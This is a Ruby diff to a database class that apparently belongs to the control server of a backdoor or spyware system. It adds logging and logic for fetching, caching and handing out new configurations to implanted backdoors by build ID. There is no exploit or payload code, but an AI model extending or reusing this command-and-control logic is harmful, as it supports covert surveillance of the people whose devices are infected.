@@ -164,6 +164,8 @@ class DB
     # if the database has gone, reply with a fake response in order for the sync to continue
     return DB::UNKNOWN_BACKDOOR, 0 if not @available
 
+    trace :debug, "Asking the status of [#{build_id}] to the db"
+    
     # ask the database the status of the backdoor
     return @db.status_of(build_id, instance_id, subtype)
   end
@@ -177,13 +179,33 @@ class DB
   end
 
   def new_conf?(bid)
-    #TODO: config retrieval
-    #TODO: put the config in the cache
-    return false
+
+    # check if we have the config in the cache
+    # probably and old one not yet sent
+    return true if Cache.new_conf? bid
+
+    # retrieve the config from the db
+    cid, config = @db.new_conf bid
+
+    # put the config in the cache
+    Cache.save_conf bid, cid, config unless config.nil?
+
+    return (config.nil?) ? false : true
   end
+
   def new_conf(bid)
-    #TODO: retrieve the config from the cache
-    return nil
+    # retrieve the config from the cache
+    cid, config = Cache.new_conf bid
+
+    return nil if config.nil?
+
+    # set the status to "sent" in the db
+    #@db.conf_sent cid
+
+    # delete the conf from the cache
+    Cache.del_conf bid
+
+    return config
   end
 
   def new_uploads?(bid)
